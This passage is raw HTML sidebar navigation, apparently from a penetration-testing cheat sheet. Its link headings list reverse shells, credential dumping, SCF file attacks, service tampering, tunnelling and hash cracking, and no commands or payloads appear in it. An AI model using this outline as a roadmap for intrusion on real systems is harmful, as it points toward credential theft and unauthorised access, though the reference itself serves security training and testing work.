href="#encryption--tools" class="nav-list-link">Tools</a><ul class="nav-list"><li class="nav-list-item"><a href="#encryption--tools--ciphey" class="nav-list-link">Ciphey</a></li><li class="nav-list-item"><a href="#encryption--tools--rsactftool" class="nav-list-link">RsaCtfTool</a></li><li class="nav-list-item"><a href="#encryption--tools--gpg" class="nav-list-link">GPG</a></li><li class="nav-list-item"><a href="#encryption--tools--decodify" class="nav-list-link">Decodify</a></li><li class="nav-list-item"><a href="#encryption--tools--subbreaker" class="nav-list-link">Subbreaker</a></li><li class="nav-list-item"><a href="#encryption--tools--rot" class="nav-list-link">ROT</a></li><li class="nav-list-item"><a href="#encryption--tools--balbuzard" class="nav-list-link">balbuzard</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#active-directory" class="nav-list-link">Active Directory</a><ul class="nav-list"><li class="nav-list-item"><a href="#active-directory--addspn-py" class="nav-list-link">addspn.py</a></li><li class="nav-list-item"><a href="#active-directory--dnstool-py" class="nav-list-link">dnstool.py</a></li><li class="nav-list-item"><a href="#active-directory--gmsadumper" class="nav-list-link">gMSADumper</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#firewall" class="nav-list-link">Firewall</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#firewall--centos" class="nav-list-link">CentOS</a><ul class="nav-list"><li class="nav-list-item"><a href="#firewall--centos--firewalld" class="nav-list-link">firewalld</a></li></ul></li><li class="nav-list-item"><a href="#firewall--windows" class="nav-list-link">Windows</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#reverse-bind-shells---tty" class="nav-list-link">Reverse/Bind shells + TTY</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#reverse-bind-shells---tty--linux" class="nav-list-link">Linux</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#reverse-bind-shells---tty--linux--shells" class="nav-list-link">Shells</a><ul class="nav-list"><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--shells--netcat-traditional-ncat" class="nav-list-link">Netcat Traditional/Ncat</a></li><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--shells--netcat-openbsd" class="nav-list-link">Netcat OpenBSD</a></li><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--shells--netcat-busybox" class="nav-list-link">Netcat Busybox</a></li><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--shells--socat" class="nav-list-link">Socat</a></li><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--shells--openssl" class="nav-list-link">OpenSSL</a></li><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--shells--bash" class="nav-list-link">Bash</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#reverse-bind-shells---tty--linux--tty-pty-upgrade" class="nav-list-link">TTY/PTY Upgrade</a><ul class="nav-list"><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--tty-pty-upgrade--script" class="nav-list-link">Script</a></li><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--tty-pty-upgrade--python" class="nav-list-link">Python</a></li><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--tty-pty-upgrade--perl" class="nav-list-link">Perl</a></li><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--tty-pty-upgrade--socat" class="nav-list-link">Socat</a></li></ul></li><li class="nav-list-item"><a href="#reverse-bind-shells---tty--linux--full-interactivity" class="nav-list-link">Full Interactivity</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#reverse-bind-shells---tty--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#reverse-bind-shells---tty--windows--shells" class="nav-list-link">Shells</a><ul class="nav-list"><li class="nav-list-item"><a href="#reverse-bind-shells---tty--windows--shells--netcat-traditional-ncat" class="nav-list-link">Netcat Traditional/Ncat</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#system-enumeration" class="nav-list-link">System Enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#system-enumeration--linux" class="nav-list-link">Linux</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#system-enumeration--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#system-enumeration--windows--cmd-exe" class="nav-list-link">cmd.exe</a></li><li class="nav-list-item"><a href="#system-enumeration--windows--powershell" class="nav-list-link">PowerShell</a></li></ul></li><li class="nav-list-item"><a href="#system-enumeration--docker" class="nav-list-link">Docker</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#system-monitoring" class="nav-list-link">System Monitoring</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#system-monitoring--linux" class="nav-list-link">Linux</a><ul class="nav-list"><li class="nav-list-item"><a href="#system-monitoring--linux--pspy" class="nav-list-link">pspy</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#system-vulnerability-enumeration" class="nav-list-link">System Vulnerability Enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#system-vulnerability-enumeration--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#system-vulnerability-enumeration--windows--generic" class="nav-list-link">Generic</a><ul class="nav-list"><li class="nav-list-item"><a href="#system-vulnerability-enumeration--windows--generic--winpeas" class="nav-list-link">winPEAS</a></li><li class="nav-list-item"><a href="#system-vulnerability-enumeration--windows--generic--windows-exploit-suggester" class="nav-list-link">Windows-Exploit-Suggester</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#system-vulnerability-enumeration--windows--kernel" class="nav-list-link">Kernel</a><ul class="nav-list"><li class="nav-list-item"><a href="#system-vulnerability-enumeration--windows--kernel--sherlock" class="nav-list-link">Sherlock</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#system-vulnerability-enumeration--linux" class="nav-list-link">Linux</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#system-vulnerability-enumeration--linux--generic" class="nav-list-link">Generic</a><ul class="nav-list"><li class="nav-list-item"><a href="#system-vulnerability-enumeration--linux--generic--linpeas" class="nav-list-link">linPEAS</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#folders-enumeration" class="nav-list-link">Folders Enumeration</a><ul class="nav-list"><li class="nav-list-item"><a href="#folders-enumeration--windows" class="nav-list-link">Windows</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file" class="nav-list-link">File</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--transfer" class="nav-list-link">Transfer</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--transfer--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--transfer--windows--download" class="nav-list-link">Download</a><ul class="nav-list"><li class="nav-list-item"><a href="#file--transfer--windows--download--cmd-exe" class="nav-list-link">cmd.exe</a></li><li class="nav-list-item"><a href="#file--transfer--windows--download--powershell" class="nav-list-link">PowerShell</a></li><li class="nav-list-item"><a href="#file--transfer--windows--download--smb" class="nav-list-link">SMB</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--transfer--windows--upload" class="nav-list-link">Upload</a><ul class="nav-list"><li class="nav-list-item"><a href="#file--transfer--windows--upload--servers" class="nav-list-link">Servers</a></li><li class="nav-list-item"><a href="#file--transfer--windows--upload--cmd-exe" class="nav-list-link">cmd.exe</a></li><li class="nav-list-item"><a href="#file--transfer--windows--upload--powershell" class="nav-list-link">PowerShell</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--transfer--linux" class="nav-list-link">Linux</a><ul class="nav-list"><li class="nav-list-item"><a href="#file--transfer--linux--perl-file--fetch" class="nav-list-link">Perl File::Fetch</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--attack" class="nav-list-link">Attack</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--attack--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#file--attack--windows--scf-file-attack" class="nav-list-link">SCF File Attack</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--compression---archive" class="nav-list-link">Compression / Archive</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--compression---archive--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#file--compression---archive--windows--troubleshooting" class="nav-list-link">Troubleshooting</a></li><li class="nav-list-item"><a href="#file--compression---archive--windows--unzip" class="nav-list-link">Unzip</a></li><li class="nav-list-item"><a href="#file--compression---archive--windows--zip" class="nav-list-link">Zip</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--recovery" class="nav-list-link">Recovery</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--recovery--ext4" class="nav-list-link">Ext4</a><ul class="nav-list"><li class="nav-list-item"><a href="#file--recovery--ext4--ext4magic" class="nav-list-link">ext4magic</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#file--recovery---ds_store" class="nav-list-link">.DS_Store</a><ul class="nav-list"><li class="nav-list-item"><a href="#file--recovery---ds_store--python-dsstore" class="nav-list-link">Python-dsstore</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#file--signatures" class="nav-list-link">Signatures</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#location-common-tools" class="nav-list-link">Location Common Tools</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#location-common-tools--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#location-common-tools--windows--official-sites" class="nav-list-link">Official sites</a></li><li class="nav-list-item"><a href="#location-common-tools--windows--plink-exe" class="nav-list-link">PLINK.exe</a></li><li class="nav-list-item"><a href="#location-common-tools--windows--reg-exe-and-other-admin-tools" class="nav-list-link">REG.exe and other admin tools</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#location-common-tools--linux" class="nav-list-link">Linux</a><ul class="nav-list"><li class="nav-list-item"><a href="#location-common-tools--linux--static-get" class="nav-list-link">static-get</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection" class="nav-list-link">Port Redirection</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--scanner-configuration---fix" class="nav-list-link">Scanner Configuration / Fix</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--scanner-configuration---fix--nmap" class="nav-list-link">Nmap</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--vpn" class="nav-list-link">VPN</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--vpn--gost" class="nav-list-link">Gost</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--sshuttle" class="nav-list-link">SSHuttle</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--tfunnel" class="nav-list-link">Tfunnel</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--ssh" class="nav-list-link">SSH</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--dsvpn" class="nav-list-link">DSVPN</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--tinyvpn" class="nav-list-link">TinyVPN</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--leaf" class="nav-list-link">Leaf</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--n2n" class="nav-list-link">n2n</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--iodine" class="nav-list-link">Iodine</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--hans" class="nav-list-link">Hans</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--socat" class="nav-list-link">Socat</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--vpn--linux-tunnels" class="nav-list-link">Linux Tunnels</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--vpn--linux-tunnels--ip-to-ip" class="nav-list-link">IP-to-IP</a></li><li class="nav-list-item"><a href="#port-redirection--vpn--linux-tunnels--gre-tunnel" class="nav-list-link">GRE tunnel</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--socks---dynamic" class="nav-list-link">SOCKS / Dynamic</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--socks---dynamic--tunnel-creation" class="nav-list-link">Tunnel Creation</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--socks---dynamic--tunnel-creation--gost" class="nav-list-link">Gost</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--gost--binaries" class="nav-list-link">Binaries</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--gost--bypass-conditions" class="nav-list-link">Bypass Conditions</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks" class="nav-list-link">Reverse SOCKS</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--through-unavoidable-intermediate-proxies" class="nav-list-link">Through unavoidable intermediate Proxies</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-ssh" class="nav-list-link">Over SSH</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-quic" class="nav-list-link">Over QUIC</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-websockets" class="nav-list-link">Over Websockets</a></li></ul></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--gost--auto-http---socks5-proxy-on-reverse-proxy" class="nav-list-link">Auto HTTP + Socks5 Proxy on Reverse Proxy</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--gost--access-the-client-s-network-from-server" class="nav-list-link">Access the Client&#8217;s Network from Server</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--gost--transparent-proxy" class="nav-list-link">Transparent Proxy</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--socks---dynamic--tunnel-creation--chisel" class="nav-list-link">Chisel</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--chisel--binaries" class="nav-list-link">Binaries</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--chisel--reverse-socks5" class="nav-list-link">Reverse SOCKS5</a></li></ul></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-creation--plink-exe" class="nav-list-link">PLINK.EXE</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--socks---dynamic--tunnel-usage" class="nav-list-link">Tunnel Usage</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-usage--tun2socks" class="nav-list-link">tun2socks</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-usage--ipio" class="nav-list-link">Ipio</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-usage--graftcp" class="nav-list-link">Graftcp</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-usage--proxychains" class="nav-list-link">ProxyChains</a></li><li class="nav-list-item"><a href="#port-redirection--socks---dynamic--tunnel-usage--browser" class="nav-list-link">Browser</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--individual-ports" class="nav-list-link">Individual Ports</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--individual-ports--gost" class="nav-list-link">Gost</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--individual-ports--gost--ssh" class="nav-list-link">SSH</a></li><li class="nav-list-item"><a href="#port-redirection--individual-ports--gost--simple-tcp-udp-redirection---direct" class="nav-list-link">Simple TCP/UDP Redirection - Direct</a></li><li class="nav-list-item"><a href="#port-redirection--individual-ports--gost--multiple-tcp-udp-redirection---relay" class="nav-list-link">Multiple TCP/UDP Redirection - Relay</a></li></ul></li><li class="nav-list-item"><a href="#port-redirection--individual-ports--mr2" class="nav-list-link">mr2</a></li><li class="nav-list-item"><a href="#port-redirection--individual-ports--socat" class="nav-list-link">Socat</a></li><li class="nav-list-item"><a href="#port-redirection--individual-ports--plink-exe" class="nav-list-link">PLINK.exe</a></li><li class="nav-list-item"><a href="#port-redirection--individual-ports--rinetd" class="nav-list-link">Rinetd</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--http-proxy" class="nav-list-link">HTTP Proxy</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--http-proxy--gost" class="nav-list-link">Gost</a></li><li class="nav-list-item"><a href="#port-redirection--http-proxy--netsh" class="nav-list-link">Netsh</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--ssl---tls-proxy" class="nav-list-link">SSL / TLS Proxy</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--ssl---tls-proxy--gost" class="nav-list-link">Gost</a></li><li class="nav-list-item"><a href="#port-redirection--ssl---tls-proxy--stunnel" class="nav-list-link">stunnel</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#port-redirection--listeners" class="nav-list-link">Listeners</a><ul class="nav-list"><li class="nav-list-item"><a href="#port-redirection--listeners--authbind" class="nav-list-link">Authbind</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web-servers---proxies" class="nav-list-link">Web Servers &amp; Proxies</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web-servers---proxies--http" class="nav-list-link">HTTP</a><ul class="nav-list"><li class="nav-list-item"><a href="#web-servers---proxies--http--perl" class="nav-list-link">Perl</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#web-servers---proxies--wpad-pac---ntlm" class="nav-list-link">WPAD/PAC &amp; NTLM</a><ul class="nav-list"><li class="nav-list-item"><a href="#web-servers---proxies--wpad-pac---ntlm--depac" class="nav-list-link">dePAC</a></li><li class="nav-list-item"><a href="#web-servers---proxies--wpad-pac---ntlm--pacproxy" class="nav-list-link">pacproxy</a></li><li class="nav-list-item"><a href="#web-servers---proxies--wpad-pac---ntlm--alpaca" class="nav-list-link">alpaca</a></li><li class="nav-list-item"><a href="#web-servers---proxies--wpad-pac---ntlm--paxy" class="nav-list-link">paxy</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#remote-command-execution" class="nav-list-link">Remote Command Execution</a><ul class="nav-list"><li class="nav-list-item"><a href="#remote-command-execution--windows" class="nav-list-link">Windows</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#service-tampering" class="nav-list-link">Service Tampering</a><ul class="nav-list"><li class="nav-list-item"><a href="#service-tampering--windows" class="nav-list-link">Windows</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#credentials" class="nav-list-link">Credentials</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#credentials--dump" class="nav-list-link">Dump</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#credentials--dump--windows" class="nav-list-link">Windows</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#credentials--dump--windows--common-registry--logs--etc" class="nav-list-link">Common Registry, logs, etc</a><ul class="nav-list"><li class="nav-list-item"><a href="#credentials--dump--windows--common-registry--logs--etc--batch---cmd-exe" class="nav-list-link">Batch / cmd.exe</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#credentials--dump--windows--common-registry--logs--etc--impacket" class="nav-list-link">Impacket</a><ul class="nav-list"><li class="nav-list-item"><a href="#credentials--dump--windows--common-registry--logs--etc--impacket--secretsdump" class="nav-list-link">Secretsdump</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#credentials--dump--windows--vnc" class="nav-list-link">VNC</a><ul class="nav-list"><li class="nav-list-item"><a href="#credentials--dump--windows--vnc--realvnc" class="nav-list-link">RealVNC</a></li><li class="nav-list-item"><a href="#credentials--dump--windows--vnc--tightvnc" class="nav-list-link">TightVNC</a></li><li class="nav-list-item"><a href="#credentials--dump--windows--vnc--tigervnc" class="nav-list-link">TigerVNC</a></li><li class="nav-list-item"><a href="#credentials--dump--windows--vnc--ultravnc" class="nav-list-link">UltraVNC</a></li></ul></li></ul></li></ul></li><li class="nav-list-item"><a href="#credentials--import" class="nav-list-link">Import</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#hashes" class="nav-list-link">Hashes</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#hashes--identification" class="nav-list-link">Identification</a><ul class="nav-list"><li class="nav-list-item"><a href="#hashes--identification--name-that-hash" class="nav-list-link">Name-That-Hash</a></li><li class="nav-list-item"><a href="#hashes--identification--haiti" class="nav-list-link">Haiti</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#hashes--bruteforce" class="nav-list-link">Bruteforce</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#hashes--bruteforce--wordlists" class="nav-list-link">Wordlists</a><ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#hashes--bruteforce--wordlists--pre-made" class="nav-list-link">Pre-made</a><ul class="nav-list"><li class="nav-list-item"><a href="#hashes--bruteforce--wordlists--pre-made--passwords" class="nav-list-link">Passwords</a></li><li class="nav-list-item"><a href="#hashes--bruteforce--wordlists--pre-made--users" class="nav-list-link">Users</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#hashes--bruteforce--wordlists--tools" class="nav-list-link">Tools</a><ul class="nav-list"><li class="nav-list-item"><a href="#hashes--bruteforce--wordlists--tools--cewl" class="nav-list-link">CeWL</a></li><li class="nav-list-item"><a href="#hashes--bruteforce--wordlists--tools--duplicut" class="nav-list-link">Duplicut</a></li><li class="nav-list-item"><a href="#hashes--bruteforce--wordlists--tools--crunch" class="nav-list-link">Crunch</a></li></ul></li></ul></li><li class="nav-list-item"><a href="#hashes--bruteforce--john-the-ripper" class="nav-list-link">John The Ripper</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#hashes--bruteforce--hashcat" class="nav-list-link">Hashcat</a><ul class="nav-list"><li class="nav-list-item"><a href="#hashes--bruteforce--hashcat--installation" class="nav-list-link">Installation</a></li><li class="nav-list-item"><a href="#hashes--bruteforce--hashcat--old-packages-legacy-systems---unneeded" class="nav-list-link">Old packages/Legacy Systems - Unneeded</a></li><li class="nav-list-item"><a href="#hashes--bruteforce--hashcat--rules" class="nav-list-link">Rules</a></li><li class="nav-list-item"><a href="#hashes--bruteforce--hashcat--usage" class="nav-list-link">Usage</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="#hashes--bruteforce--decode" class="nav-list-link">Decode</a><ul class="nav-list"><li class="nav-list-item"><a href="#hashes--bruteforce--decode--references" class="nav-list-link">References</a></li><li class="nav-list-item"><a 